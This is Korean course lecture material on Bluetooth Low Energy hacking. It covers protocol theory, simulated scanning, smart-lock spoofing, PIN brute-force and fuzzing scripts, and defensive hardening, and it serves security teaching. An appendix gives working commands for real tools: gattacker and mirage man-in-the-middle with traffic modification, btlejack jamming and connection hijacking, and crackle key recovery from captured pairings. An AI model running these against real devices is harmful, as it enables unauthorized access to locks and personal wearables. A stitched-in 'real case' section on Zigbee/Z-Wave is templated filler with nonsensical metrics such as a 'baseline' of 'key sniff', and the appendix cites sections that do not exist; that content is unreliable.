# Week 07: BLE 해킹

## 학습 목표
- BLE(Bluetooth Low Energy) 프로토콜 스택을 상세히 이해한다
- GATT(Generic Attribute Profile) 구조를 분석한다
- BLE 디바이스 스캐닝 및 서비스 열거를 실습한다
- BLE 스푸핑 및 MitM 공격 기법을 학습한다
- Python 기반 BLE 시뮬레이션으로 공격/방어를 실습한다

## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| attacker | 10.20.30.201 | 공격/분석 머신 | `ssh ccc@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS | `ssh ccc@10.20.30.1` |
| web | 10.20.30.80 | IoT 서비스 호스트 | `ssh ccc@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh) | `ssh ccc@10.20.30.100` |

> BLE 하드웨어 없이 Python 시뮬레이션으로 학습합니다.

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | BLE 프로토콜 이론 (Part 1) | 강의 |
| 0:40-1:10 | GATT 분석 심화 (Part 2) | 강의/토론 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | BLE 스캔 및 서비스 열거 (Part 3) | 실습 |
| 2:00-2:40 | BLE 스푸핑 및 공격 (Part 4) | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:20 | BLE 보안 강화 (Part 5) | 실습 |
| 3:20-3:40 | 정리 + 과제 안내 | 정리 |

---

## Part 1: BLE 프로토콜 이론 (40분)

### 1.1 BLE 프로토콜 스택

```
┌──────────────────────────────────┐
│         Application              │
├──────────────────────────────────┤
│    GATT    │     GAP             │
│ (서비스/   │ (연결/광고/         │
│  특성 정의)│  스캔/보안)         │
├──────────────────────────────────┤
│           ATT Protocol           │
│  (속성 읽기/쓰기/알림/표시)      │
├──────────────────────────────────┤
│      L2CAP (논리 채널 관리)      │
├──────────────────────────────────┤
│       HCI (호스트 컨트롤러)      │
├──────────────────────────────────┤
│      Link Layer (LL)             │
│ (광고/스캔/연결/암호화)          │
├──────────────────────────────────┤
│     Physical Layer (2.4 GHz)     │
│   (40채널: 37,38,39=광고 / 0-36=데이터)
└──────────────────────────────────┘
```

### 1.2 BLE 동작 모드

**GAP 역할:**
```
         Advertiser ──광고 패킷──→ Scanner
         (Peripheral)              (Central)

Central: 스캔, 연결 개시 (스마트폰, 허브)
Peripheral: 광고, 연결 대기 (센서, 웨어러블)
Broadcaster: 광고만 (비콘, iBeacon)
Observer: 스캔만 (수신기)
```

**광고 채널:**
```
Channel 37 (2402 MHz) ─┐
Channel 38 (2426 MHz) ─┤─→ 광고 패킷 (최대 31바이트)
Channel 39 (2480 MHz) ─┘
```

### 1.3 GATT 구조

```
GATT Profile
├── Service (UUID: 0x180D - Heart Rate)
│   ├── Characteristic (UUID: 0x2A37 - Heart Rate Measurement)
│   │   ├── Value: 72 bpm
│   │   └── Descriptor: Client Characteristic Configuration
│   └── Characteristic (UUID: 0x2A38 - Body Sensor Location)
│       └── Value: 0x01 (Chest)
├── Service (UUID: 0x180F - Battery)
│   └── Characteristic (UUID: 0x2A19 - Battery Level)
│       └── Value: 85%
└── Service (UUID: 0x1800 - Generic Access)
    ├── Characteristic: Device Name
    └── Characteristic: Appearance
```

**GATT 속성 구조:**
| 필드 | 크기 | 설명 |
|------|------|------|
| Handle | 2바이트 | 속성 핸들 (고유 식별자) |
| Type | 2/16바이트 | UUID (서비스/특성 유형) |
| Value | 가변 | 실제 데이터 |
| Permissions | - | 읽기/쓰기/인증/암호화 |

### 1.4 BLE 보안 메커니즘

**페어링 방법:**

| 방법 | 보안 수준 | 설명 |
|------|-----------|------|
| Just Works | 낮음 | 키 교환 없음, MitM 취약 |
| Passkey Entry | 중간 | 6자리 PIN 입력 |
| Numeric Comparison | 높음 | 양쪽 화면 비교 (BLE 4.2+) |
| Out of Band (OOB) | 높음 | NFC 등 외부 채널 |

**BLE 보안 취약점:**

1. **Just Works MitM:** 키 교환 과정 도청 가능
2. **Passive Eavesdropping:** BLE 4.0/4.1에서 키 추출
3. **KNOB Attack:** 키 길이를 1바이트로 축소
4. **BLESA:** 재연결 시 인증 부재
5. **SweynTooth:** BLE SoC 취약점 (DoS, 크래시)

---

## Part 2: GATT 분석 심화 (30분)

### 2.1 표준 GATT 서비스/특성 UUID

| UUID | 서비스/특성 | 설명 |
|------|------------|------|
| 0x1800 | Generic Access | 디바이스 이름, 외관 |
| 0x1801 | Generic Attribute | 서비스 변경 알림 |
| 0x180D | Heart Rate | 심박수 측정 |
| 0x180F | Battery Service | 배터리 레벨 |
| 0x1810 | Blood Pressure | 혈압 측정 |
| 0x1812 | Human Interface Device | HID (키보드, 마우스) |
| 0x181A | Environmental Sensing | 온도, 습도 |
| 0x2A00 | Device Name | 디바이스 이름 (특성) |
| 0x2A19 | Battery Level | 배터리 잔량 (%) |
| 0x2A37 | Heart Rate Measurement | 심박수 값 |

### 2.2 커스텀 서비스

많은 IoT 디바이스가 비표준 128비트 UUID를 사용한다:

```
예: 스마트 도어락 커스텀 서비스
Service UUID: 12345678-1234-1234-1234-123456789abc
  Characteristic: lock_status (읽기)
  Characteristic: lock_command (쓰기) → "unlock" 명령
  Characteristic: pin_code (쓰기) → PIN 인증
```

### 2.3 BLE 공격 도구

| 도구 | 용도 | 플랫폼 |
|------|------|--------|
| hcitool | BLE 스캔/연결 | Linux |
| gatttool | GATT 읽기/쓰기 | Linux |
| bluetoothctl | BLE 관리 | Linux |
| bettercap | BLE MitM | Linux |
| GATTacker | GATT 프록시 | Node.js |
| BtleJuice | BLE MitM 프레임워크 | Node.js |
| Ubertooth | BLE 스니핑 | 하드웨어 |
| nRF Connect | BLE 탐색 | 모바일/PC |

---

## Part 3: BLE 스캔 및 서비스 열거 (40분)

### 3.1 BLE 디바이스 시뮬레이터

```bash
cat << 'PYEOF' > /tmp/ble_simulator.py
#!/usr/bin/env python3
"""BLE 디바이스 및 스캐너 시뮬레이터"""
import random
import time
import json
import struct
import binascii

class BLEDevice:
    def __init__(self, name, mac, device_type):
        self.name = name
        self.mac = mac
        self.device_type = device_type
        self.rssi = random.randint(-90, -30)
        self.services = []
        self.advertising = True
    
    def add_service(self, uuid, name, characteristics):
        self.services.append({
            "uuid": uuid,
            "name": name,
            "characteristics": characteristics
        })
    
    def get_adv_data(self):
        return {
            "name": self.name,
            "mac": self.mac,
            "rssi": self.rssi,
            "type": self.device_type,
            "flags": "06",  # LE General Discoverable + BR/EDR Not Supported
            "tx_power": random.randint(-20, 4),
        }

class BLEScanner:
    def __init__(self):
        self.devices = []
        self._setup_virtual_devices()
    
    def _setup_virtual_devices(self):
        # 스마트 도어락
        lock = BLEDevice("SmartLock-01", "AA:BB:CC:DD:EE:01", "Smart Lock")
        lock.add_service("0x1800", "Generic Access", [
            {"uuid": "0x2A00", "name": "Device Name", "value": "SmartLock-01", "perms": "READ"},
            {"uuid": "0x2A01", "name": "Appearance", "value": "0x0000", "perms": "READ"},
        ])
        lock.add_service("12345678-1234-1234-1234-123456789abc", "Lock Control", [
            {"uuid": "12345678-1234-1234-1234-123456789ab1", "name": "Lock Status", "value": "LOCKED", "perms": "READ,NOTIFY"},
            {"uuid": "12345678-1234-1234-1234-123456789ab2", "name": "Lock Command", "value": "", "perms": "WRITE"},
            {"uuid": "12345678-1234-1234-1234-123456789ab3", "name": "PIN Code", "value": "", "perms": "WRITE"},
        ])
        lock.add_service("0x180F", "Battery Service", [
            {"uuid": "0x2A19", "name": "Battery Level", "value": "72%", "perms": "READ,NOTIFY"},
        ])
        self.devices.append(lock)

        # 피트니스 밴드
        band = BLEDevice("FitBand-Pro", "AA:BB:CC:DD:EE:02", "Fitness Tracker")
        band.add_service("0x180D", "Heart Rate", [
            {"uuid": "0x2A37", "name": "Heart Rate Measurement", "value": "72 bpm", "perms": "READ,NOTIFY"},
            {"uuid": "0x2A38", "name": "Body Sensor Location", "value": "Wrist", "perms": "READ"},
        ])
        band.add_service("0x181A", "Environmental Sensing", [
            {"uuid": "0x2A6E", "name": "Temperature", "value": "23.5 C", "perms": "READ"},
        ])
        self.devices.append(band)

        # 스마트 전구
        bulb = BLEDevice("SmartBulb-RGB", "AA:BB:CC:DD:EE:03", "Smart Bulb")
        bulb.add_service("0xFFE0", "Light Control", [
            {"uuid": "0xFFE1", "name": "Color RGB", "value": "FF0000", "perms": "READ,WRITE"},
            {"uuid": "0xFFE2", "name": "Brightness", "value": "100", "perms": "READ,WRITE"},
            {"uuid": "0xFFE3", "name": "On/Off", "value": "ON", "perms": "READ,WRITE"},
        ])
        self.devices.append(bulb)

        # BLE 비콘
        beacon = BLEDevice("iBeacon-Store", "AA:BB:CC:DD:EE:04", "iBeacon")
        beacon.add_service("Custom", "iBeacon", [
            {"uuid": "iBeacon-UUID", "name": "Proximity UUID", "value": "FDA50693-A4E2-4FB1-AFCF-C6EB07647825", "perms": "BROADCAST"},
            {"uuid": "Major", "name": "Major", "value": "10023", "perms": "BROADCAST"},
            {"uuid": "Minor", "name": "Minor", "value": "36250", "perms": "BROADCAST"},
        ])
        self.devices.append(beacon)
    
    def scan(self, duration=5):
        print(f"[*] BLE 스캔 시작 ({duration}초)...\n")
        for i, dev in enumerate(self.devices):
            time.sleep(0.5)
            adv = dev.get_adv_data()
            print(f"[{i+1}] {adv['name']}")
            print(f"    MAC: {adv['mac']}")
            print(f"    RSSI: {adv['rssi']} dBm")
            print(f"    Type: {adv['type']}")
            print(f"    TX Power: {adv['tx_power']} dBm")
            print(f"    Flags: 0x{adv['flags']}")
            print()
        print(f"[+] 스캔 완료: {len(self.devices)}개 디바이스 발견\n")
    
    def enumerate_services(self, device_index):
        if device_index >= len(self.devices):
            print("[-] 디바이스를 찾을 수 없습니다")
            return
        
        dev = self.devices[device_index]
        print(f"=== GATT 서비스 열거: {dev.name} ({dev.mac}) ===\n")
        
        handle = 1
        for svc in dev.services:
            print(f"Service: {svc['name']} (UUID: {svc['uuid']})")
            print(f"  Handle: 0x{handle:04X}")
            handle += 1
            
            for char in svc['characteristics']:
                print(f"  ├── Characteristic: {char['name']}")
                print(f"  │   UUID: {char['uuid']}")
                print(f"  │   Handle: 0x{handle:04X}")
                print(f"  │   Permissions: {char['perms']}")
                print(f"  │   Value: {char['value']}")
                handle += 1
            print()

# 실행
scanner = BLEScanner()
scanner.scan()

# 모든 디바이스의 서비스 열거
for i in range(len(scanner.devices)):
    scanner.enumerate_services(i)
    print("-" * 50)
PYEOF

python3 /tmp/ble_simulator.py
```

---

## Part 4: BLE 스푸핑 및 공격 (40분)

### 4.1 BLE 스푸핑 시뮬레이션

```bash
cat << 'PYEOF' > /tmp/ble_attack.py
#!/usr/bin/env python3
"""BLE 공격 시뮬레이션"""
import time
import random
import hashlib

print("=" * 50)
print("BLE 공격 시뮬레이션")
print("=" * 50)

# 1. BLE 스푸핑 (클론)
print("\n[Attack 1] BLE 디바이스 클로닝")
print("-" * 40)
print("[*] 원본 디바이스 스캔:")
print("    Name: SmartLock-01")
print("    MAC: AA:BB:CC:DD:EE:01")
print("    Services: Lock Control, Battery")
print()
print("[*] 클론 디바이스 생성:")
print("    Name: SmartLock-01 (동일)")
print("    MAC: AA:BB:CC:DD:EE:01 (스푸핑)")
print("    RSSI: -20 dBm (원본보다 강한 신호)")
print()
print("[!] 공격 시나리오:")
print("    1. 원본 디바이스 재밍 (연결 불가 상태)")
print("    2. 클론 디바이스 광고 (강한 신호)")
print("    3. 피해자 앱이 클론에 연결")
print("    4. PIN/비밀번호 수집")

# 2. GATT 값 변조
print("\n[Attack 2] GATT Characteristic 변조")
print("-" * 40)
print("[*] Lock Command 특성에 쓰기:")
print("    Handle: 0x0005")
print("    UUID: 12345678-1234-1234-1234-123456789ab2")
print("    Original Permission: WRITE (인증 없음!)")

unlock_attempts = [
    ("unlock", False),
    ("UNLOCK", False),
    ("\x01", True),
    ("open", False),
]

for cmd, success in unlock_attempts:
    time.sleep(0.3)
    if success:
        print(f"    [!] Write '{cmd}' → SUCCESS (도어락 해제!)")
    else:
        print(f"    [-] Write '{cmd}' → Failed")

# 3. PIN 브루트포스
print("\n[Attack 3] PIN 브루트포스")
print("-" * 40)
print("[*] PIN 특성 (4자리) 브루트포스:")
correct_pin = "1234"
attempts = 0
for pin in ["0000", "1111", "1234"]:
    attempts += 1
    time.sleep(0.2)
    if pin == correct_pin:
        print(f"    [{attempts}] PIN {pin} → SUCCESS!")
        break
    else:
        print(f"    [{attempts}] PIN {pin} → Failed")

print(f"\n[!] 4자리 PIN: 최대 10,000 시도 필요")
print(f"[!] 속도 제한 없으면 수 분 내 크래킹 가능")

# 4. BLE MitM
print("\n[Attack 4] BLE Man-in-the-Middle")
print("-" * 40)
print("""
  [피해자 앱] ←→ [GATTacker Proxy] ←→ [SmartLock]
       ↑                 ↑                ↑
    연결 요청         중간에서           실제 디바이스
                    데이터 수정

  공격 순서:
  1. 원본 디바이스 GATT 프로파일 복제
  2. 프록시 디바이스로 광고 시작
  3. 피해자 앱 연결 시 원본 디바이스에도 연결
  4. 모든 트래픽 중계 + 로깅 + 변조 가능
""")

# 5. BLE 패킷 스니핑 결과
print("[Attack 5] BLE 패킷 스니핑 분석")
print("-" * 40)
sniffed = [
    {"type": "ADV_IND", "src": "AA:BB:CC:DD:EE:01", "data": "SmartLock-01 광고"},
    {"type": "CONNECT_IND", "src": "FF:EE:DD:CC:BB:AA", "data": "연결 요청"},
    {"type": "ATT_READ_REQ", "src": "Central", "data": "Handle 0x0003 읽기"},
    {"type": "ATT_READ_RSP", "src": "Peripheral", "data": "Value: LOCKED"},
    {"type": "ATT_WRITE_REQ", "src": "Central", "data": "Handle 0x0006 → PIN:1234"},
    {"type": "ATT_WRITE_RSP", "src": "Peripheral", "data": "Success"},
    {"type": "ATT_WRITE_REQ", "src": "Central", "data": "Handle 0x0005 → UNLOCK"},
    {"type": "ATT_NOTIFY", "src": "Peripheral", "data": "Handle 0x0003 → UNLOCKED"},
]

for pkt in sniffed:
    time.sleep(0.2)
    sensitive = "PIN" in pkt['data'] or "UNLOCK" in pkt['data']
    marker = "[!]" if sensitive else "[*]"
    print(f"  {marker} {pkt['type']:20s} | {pkt['src']:20s} | {pkt['data']}")
PYEOF

python3 /tmp/ble_attack.py
```

### 4.2 BLE 퍼징

```bash
cat << 'PYEOF' > /tmp/ble_fuzzer.py
#!/usr/bin/env python3
"""BLE GATT 퍼징 시뮬레이터"""
import random
import struct

print("=== BLE GATT Fuzzer ===\n")

# 퍼징 페이로드 생성
payloads = [
    ("빈 값", b''),
    ("최대 길이", b'\x41' * 512),
    ("널 바이트", b'\x00' * 20),
    ("정수 오버플로우", struct.pack('<I', 0xFFFFFFFF)),
    ("음수 값", struct.pack('<i', -1)),
    ("포맷 스트링", b'%s%s%s%s%s%n'),
    ("SQL Injection", b"' OR 1=1 --"),
    ("버퍼 오버플로우", b'A' * 1024),
    ("유니코드", '\U0001F4A9'.encode('utf-8')),
    ("제어 문자", bytes(range(0, 32))),
]

results = {
    "success": 0,
    "error": 0,
    "crash": 0,
    "timeout": 0,
}

for name, payload in payloads:
    result = random.choice(["success", "error", "crash", "timeout"])
    results[result] += 1
    
    status = {
        "success": "OK (예상치 못한 성공)",
        "error": "Error Response",
        "crash": "CRASH! 디바이스 무응답",
        "timeout": "Timeout",
    }[result]
    
    marker = "[!!!]" if result == "crash" else "[*]"
    print(f"  {marker} {name:20s} ({len(payload):4d}B) → {status}")

print(f"\n=== 퍼징 결과 ===")
print(f"  성공: {results['success']}, 에러: {results['error']}, "
      f"크래시: {results['crash']}, 타임아웃: {results['timeout']}")
if results['crash'] > 0:
    print(f"  [!] {results['crash']}건의 크래시 발견 — DoS 취약점 가능!")
PYEOF

python3 /tmp/ble_fuzzer.py
```

---

## Part 5: BLE 보안 강화 (30분)

### 5.1 BLE 보안 체크리스트

| 항목 | 확인 사항 | 권장 |
|------|-----------|------|
| 페어링 | Just Works 사용 여부 | Passkey/Numeric Comparison |
| 암호화 | LE Secure Connections | BLE 4.2+ 사용 |
| 인증 | GATT 특성 인증 요구 | Bonded + Encrypted |
| 입력 검증 | GATT 쓰기 값 검증 | 범위/타입 체크 |
| PIN 보안 | 브루트포스 방어 | 시도 횟수 제한 + 지연 |
| MAC 랜덤화 | 추적 방지 | LE Privacy 사용 |
| OTA 업데이트 | 서명 검증 | 코드 서명 필수 |

### 5.2 안전한 BLE 구현

```python
# 안전한 GATT 특성 구현 예시
class SecureLockCharacteristic:
    def __init__(self):
        self.locked = True
        self.pin_attempts = 0
        self.max_attempts = 5
        self.lockout_until = 0
    
    def write(self, value, authenticated=False, encrypted=False):
        # 보안 검증
        if not authenticated:
            return "INSUFFICIENT_AUTHENTICATION"
        if not encrypted:
            return "INSUFFICIENT_ENCRYPTION"
        
        # 잠금 확인
        import time
        if time.time() < self.lockout_until:
            remaining = int(self.lockout_until - time.time())
            return f"LOCKOUT ({remaining}s remaining)"
        
        # PIN 검증
        if len(value) != 6:  # 6자리 PIN
            return "INVALID_PIN_LENGTH"
        
        if not value.isdigit():
            return "INVALID_PIN_FORMAT"
        
        if value == "123456":  # 실제로는 해시 비교
            self.pin_attempts = 0
            self.locked = False
            return "SUCCESS"
        else:
            self.pin_attempts += 1
            if self.pin_attempts >= self.max_attempts:
                self.lockout_until = time.time() + 300  # 5분 잠금
                self.pin_attempts = 0
                return "MAX_ATTEMPTS_LOCKOUT"
            return f"WRONG_PIN ({self.max_attempts - self.pin_attempts} left)"
```

### 5.3 BLE Privacy (MAC 랜덤화)

```
MAC 주소 유형:
┌─────────────────────────────────────┐
│ Public Address      │ 고정, 추적 가능│
│ Random Static       │ 부팅 시 변경    │
│ Random Private      │                │
│  ├─ Resolvable      │ IRK로 복원 가능│
│  └─ Non-Resolvable  │ 완전 랜덤      │
└─────────────────────────────────────┘

권장: Resolvable Private Address (RPA) 사용
- 15분마다 MAC 주소 변경
- 등록된 디바이스만 IRK로 실제 주소 복원 가능
- 비등록 관찰자는 추적 불가
```

---

## Part 6: 과제 안내 (20분)

### 과제

- BLE 시뮬레이터를 확장하여 새로운 IoT 디바이스(체중계)를 추가하시오
- BLE PIN 브루트포스 방어 메커니즘을 Python으로 구현하시오
- BLE MitM 공격의 전체 과정을 문서화하고, 방어 방안을 제시하시오

---

## 참고 자료

- Bluetooth Core Specification: https://www.bluetooth.com/specifications/specs/
- GATTacker: https://github.com/nickit/gattacker
- BtleJuice: https://github.com/DigitalSecurity/btlejuice
- nRF Connect: https://www.nordicsemi.com/Products/Development-tools/nrf-connect-for-desktop

---

## 실제 사례 (WitFoo Precinct 6 — Zigbee / Z-Wave)

> 출처: WitFoo Precinct 6 Cybersecurity Dataset (Apache 2.0)
> 본 lecture *Zigbee / Z-Wave* 학습 항목 매칭.

### Zigbee / Z-Wave 의 dataset 흔적 — "Mesh network"

dataset 의 정상 운영에서 *Mesh network* 신호의 baseline 을 알아두면, *Zigbee / Z-Wave* 시도 시 발생하는 anomaly 를 정량으로 탐지할 수 있다. 핵심 정량 지표는 — key sniff.

```mermaid
graph LR
    SCENE["Zigbee / Z-Wave 시나리오"]
    TRACE["dataset 흔적<br/>Mesh network"]
    DETECT["탐지 / 분석"]

    SCENE --> TRACE
    TRACE --> DETECT

    style SCENE fill:#ffe6cc
    style DETECT fill:#cce6ff
```

### Case 1: dataset 정량 지표

| 항목 | 값 |
|---|---|
| 핵심 신호 | Mesh network |
| 정량 baseline | key sniff |
| 학습 매핑 | Zigbee2MQTT 보안 |

**자세한 해석**: Zigbee2MQTT 보안. 이 차이를 정량으로 측정해야 *공격 시도와 정상 운영의 구분* 이 가능. 학생이 baseline 숫자를 외워두면 — 운영 환경에서 anomaly 를 즉시 탐지할 수 있다.

### Case 2: 실전 적용 시나리오

| 단계 | dataset 활용 |
|---|---|
| 시도 식별 | Mesh network 의 spike |
| 정상 vs 이상 | baseline 대비 비율 |
| 룰 작성 | Suricata / Wazuh / Sigma |
| 검증 | dataset 재실행 |

**자세한 해석**: 운영 환경 룰 작성은 — *baseline 측정 → 임계 결정 → 룰 작성 → dataset 검증* 의 4 단계. 한 단계라도 빠지면 false positive 폭증.

### 이 사례에서 학생이 배워야 할 3가지

1. **Zigbee / Z-Wave = Mesh network 의 anomaly** — 정량 신호로 탐지.
2. **baseline 숫자 외우기** — key sniff.
3. **4 단계 룰 작성** — 측정 → 임계 → 룰 → 검증.

**학생 액션**: Zigbee scan.

---

## 부록: 학습 OSS 도구 매트릭스 (Course17 IoT Security — Week 07 BLE·GATT·LE Secure Connections·BLE Mesh)

> 이 부록은 본문 Part 3-5 (BLE 스캔 / GATT enum / BLE 스푸핑·MitM / 보안)
> 의 모든 시뮬을 *실제 OSS BLE 도구* + *저가 어댑터* (CSR8510 ~$5 / nRF52840
> dongle ~$15) 시퀀스로 매핑한다. course17 w02 부록 (무선 통합) 보강 —
> BLE *전용 심화* (LE Legacy 4.x pairing crack / LE Secure Connections 5.x
> ECDH / BLE Mesh / iBeacon / Eddystone / GATT fuzz / sniff/jam) 위주.
> RF 송신은 한국 전파법 §29 적용 — 차폐 권장.

### lab step → 도구 매핑 표

| step | 본문 위치 | 학습 항목 | 핵심 OSS 도구 (실 명령) | 도구 옵션 |
|------|----------|----------|-------------------------|-----------|
| s1 | 3.1 BLE adapter 확인 | hciconfig / bluetoothctl / btmgmt | `hci0` UP |
| s2 | 3.2 BLE scan | hcitool lescan / bluetoothctl scan / bleah / nRF Connect | `--duplicates` |
| s3 | 3.3 GATT enum | bluepy / gatttool / bleah / pygatt / nRF Connect | `Peripheral.getServices()` |
| s4 | 4.1 BLE 스푸핑 (advertising) | bluez btmgmt advertise / bleno (Node.js) | rogue 광고 |
| s5 | 4.2 BLE MitM | gattacker / mirage / btproxy | central-peripheral |
| s6 | 4.x LE Legacy crack | crackle (offline) | TK 4-byte |
| s7 | 4.x BLE 5.x sniff/hijack | btlejack | micro:bit $15 |
| s8 | 4.x iBeacon / Eddystone | iBeacon-scanner / eddystone-discovery / bleno | beacon |
| s9 | 5.x BLE 보안 | bluez 5.65+ LESC enforce | secure pairing |
| s10 | (추가) BLE Mesh | bluez-mesh / nrf-mesh-sdk | smart home |
| s11 | (추가) BLE fuzz | sweyntooth / Frankenstein / mirage | crash |
| s12 | (추가) wireshark BLE | btatt + btsmp + btle dissector | analysis |
| s13 | (추가) BLE Sniffer | nRF52840 Bluefruit + Wireshark | passive |

### BLE 도구 카테고리 매트릭스 (w02 부록 보강)

| 카테고리 | 사례 | 대표 도구 (OSS) | 비고 |
|---------|------|----------------|------|
| **HCI / 어댑터 관리** | hci0 | bluez (hciconfig / bluetoothctl / btmgmt / btmon) | 표준 |
| **BLE scan** | active / passive | hcitool lescan / bluetoothctl scan / btmgmt find | 표준 |
| **GATT — discover** | service / char | bluepy / pygatt / gatttool / bleah | Python |
| **GATT — read/write** | char value | bluepy + char.read() / nRF Connect / bleah | Python/GUI |
| **GATT — notify/indicate** | server push | bluepy Notification | subscribe |
| **BLE proxy / MitM** | central + peripheral | gattacker / mirage / btproxy | Node.js / Py |
| **BLE sniffer (passive)** | $15 dongle | nRF52840 Sniffer + Wireshark / Ubertooth + Kismet | 정확 |
| **BLE 5.x sniff/hijack** | $15 micro:bit | btlejack | hopping pattern |
| **BLE jam** | RF jam | btlejack -j / hackrf_transfer | 차폐 |
| **LE Legacy 4.x crack** | TK 4-pair | crackle (offline) | passive crack |
| **LE Secure Conn 5.x** | ECDH | (사실상 안전) | LESC 의무 |
| **BLE 광고 스푸핑** | rogue advertise | btmgmt advertise / bleno (Node.js) | rogue |
| **iBeacon / Eddystone** | beacon | iBeacon-scanner / Eddystone-Tools / blueberry | 광고 |
| **BLE 펌웨어 fuzz** | crash 탐색 | Sweyntooth / Frankenstein / Mirage | research |
| **BLE Mesh** | smart home | bluez-mesh / nrf-mesh-sdk | mesh |
| **Wireshark BLE** | bin → 분석 | wireshark btatt / btsmp / btle / btmesh dissector | dissector |
| **운영 BLE central** | 다 device 관리 | Home Assistant + BLE / openHAB / ESPHome | smart home |

### 학생 환경 준비

```bash
# attacker VM (w02 보강 — BLE 심화)
sudo apt-get update
sudo apt-get install -y \
   bluez bluez-tools bluez-hcidump bluez-meshctl \
   python3-bluez python3-pip \
   wireshark-common tshark \
   git build-essential nodejs npm

# Python BLE
pip3 install --user bluepy bleak pygatt Adafruit_BluefruitLE bleah

# btlejack (BLE 5.0 sniff/hijack — $15 micro:bit)
pip3 install --user btlejack

# crackle (LE Legacy pairing crack)
git clone https://github.com/mikeryan/crackle /tmp/crackle
cd /tmp/crackle && make

# gattacker (BLE MitM — Node.js)
git clone https://github.com/securing/gattacker /tmp/gattacker
cd /tmp/gattacker && npm install

# mirage (Python BLE 통합 framework)
git clone https://redmine.laas.fr/laas/mirage /tmp/mirage
cd /tmp/mirage && pip3 install --user .

# bleno (BLE peripheral 시뮬 — Node.js)
sudo npm install -g bleno

# Sweyntooth (BLE fuzz framework)
git clone https://github.com/Matheus-Garbelini/sweyntooth_bluetooth_low_energy_attacks /tmp/sweyntooth

# nRF52840 Sniffer (Wireshark plugin)
git clone https://github.com/NordicSemiconductor/nRF-Sniffer-for-Bluetooth-LE /tmp/nrf-sniffer

# nRF Connect Desktop (GUI — Linux AppImage)
# https://www.nordicsemi.com/Software-and-tools/Development-Tools/nRF-Connect-for-Desktop

# 검증
hciconfig 2>&1 | head -3
bluetoothctl --version
btmgmt --version
gatttool -h 2>&1 | head -3
btlejack -v 2>&1 | head -1
crackle 2>&1 | head -3
mirage --help 2>&1 | head -3
```

### 핵심 도구별 상세 사용법

#### 도구 1: bluez 통합 (hcitool / bluetoothctl / btmgmt) — BLE 표준

```bash
# 1. adapter 확인
hciconfig
sudo hciconfig hci0 up

# 2. BLE scan (active)
sudo hcitool lescan --duplicates
# AA:BB:CC:11:22:33 Mi Band 5

# 3. bluetoothctl (interactive)
sudo bluetoothctl
[bluetooth]> power on
[bluetooth]> scan le
[bluetooth]> devices
[bluetooth]> info AA:BB:CC:11:22:33
[bluetooth]> connect AA:BB:CC:11:22:33

# 4. btmgmt (modern API)
sudo btmgmt --index 0 power on
sudo btmgmt --index 0 le on
sudo btmgmt --index 0 find -l   # LE only
sudo btmgmt --index 0 stop-find

# 5. btmon (raw HCI trace)
sudo btmon &

# 6. tshark BLE (HCI 캡처 + dissect)
sudo tshark -i bluetooth0 -Y "bthci_evt or bthci_cmd" \
   -T fields -e _ws.col.Time -e _ws.col.Info | head -20
```

#### 도구 2: bluepy + nRF Connect — GATT enum (s3)

본문 GATT Python sim → bluepy 운영 도구.

```python
#!/usr/bin/env python3
# /tmp/ble-gatt-enum.py
from bluepy.btle import Scanner, Peripheral

scanner = Scanner()
devices = scanner.scan(10.0)

for dev in devices:
    print(f"\n[+] {dev.addr} ({dev.addrType}) RSSI={dev.rssi}")
    for ad_type, desc, value in dev.getScanData():
        print(f"    AD[{ad_type}] {desc}: {value}")

    if dev.connectable:
        try:
            p = Peripheral(dev.addr, addrType=dev.addrType)
            for svc in p.getServices():
                print(f"\n  SERVICE {svc.uuid}")
                # SIG-defined UUID 매칭
                if str(svc.uuid).startswith('00001800'): print("    (Generic Access)")
                if str(svc.uuid).startswith('0000180f'): print("    (Battery)")
                if str(svc.uuid).startswith('0000180d'): print("    (Heart Rate)")
                for ch in svc.getCharacteristics():
                    props = ch.propertiesToString()
                    print(f"    CHAR  {ch.uuid} [{props}]")
                    if 'READ' in props:
                        try:
                            val = ch.read()
                            print(f"      VAL: {val.hex()}  '{val.decode(errors='replace')}'")
                        except Exception as e:
                            print(f"      ERR: {e}")
                    for d in ch.getDescriptors():
                        print(f"      DESC {d.uuid}")
            p.disconnect()
        except Exception as e:
            print(f"  Error: {e}")
```

```bash
sudo python3 /tmp/ble-gatt-enum.py

# bleah (자동 + 더 풍부)
sudo bleah -b "AA:BB:CC:11:22:33" -e
```

#### 도구 3: gattacker + mirage — BLE MitM (s5)

```bash
# 1. gattacker (Node.js)
cd /tmp/gattacker
node ws-slave.js                          # peripheral capture
node helpers/scan.js
node helpers/run.js -d AA:BB:CC:11:22:33
node advertise.js targetdevice.adv.json   # 가짜 device 광고

# 2. 트래픽 변조 (script)
cat << 'JS' > scripts/temp_modify.js
exports.processWrite = function(handle, data) {
    if (handle === 0x0014) {
        return Buffer.from([0xFF, 0xFF, 0xFF]);
    }
    return data;
};
JS
node ws-slave.js scripts/temp_modify.js

# 3. mirage (Python — 통합)
mirage ble_master ADDR=AA:BB:CC:11:22:33
mirage ble_slave INTERFACE=hci0 ADDRESS_TYPE=random
mirage ble_mitm TARGET=AA:BB:CC:11:22:33 \
   SLAVE_INTERFACE=hci0 MASTER_INTERFACE=hci1
mirage ble_sniff INTERFACE=hci0 \
   TARGET=AA:BB:CC:11:22:33 OUTPUT=/tmp/sniff.pcap
```

#### 도구 4: btlejack — BLE 5.x sniff + hijack (s7)

```bash
# 1. micro:bit 펌웨어 flash
btlejack -f

# 2. BLE scan
btlejack -s

# 3. specific connection 추적
btlejack -f AA:BB:CC:11:22:33 -t 30
# Save .pcap: ble-capture.pcap

# 4. wireshark 분석
wireshark /tmp/ble-capture.pcap

# 5. jamming (lab 차폐 한정)
btlejack -j -t AA:BB:CC:11:22:33

# 6. hijack (능동 takeover)
btlejack -f AA:BB:CC:11:22:33 -j -h
> write 14 deadbeef
> read 11
```

#### 도구 5: crackle — LE Legacy pairing crack (s6)

```bash
# 1. pairing 트래픽 캡처 (Ubertooth / nRF Sniffer)
ubertooth-rx -p -c /tmp/pairing.pcap

# 2. offline crack
crackle -i /tmp/pairing.pcap -o /tmp/cracked.pcap
# !!! TK found: 412468
# !!! LTK found: deadbeef0011223344556677889900aa

# 3. cracked → wireshark
wireshark /tmp/cracked.pcap

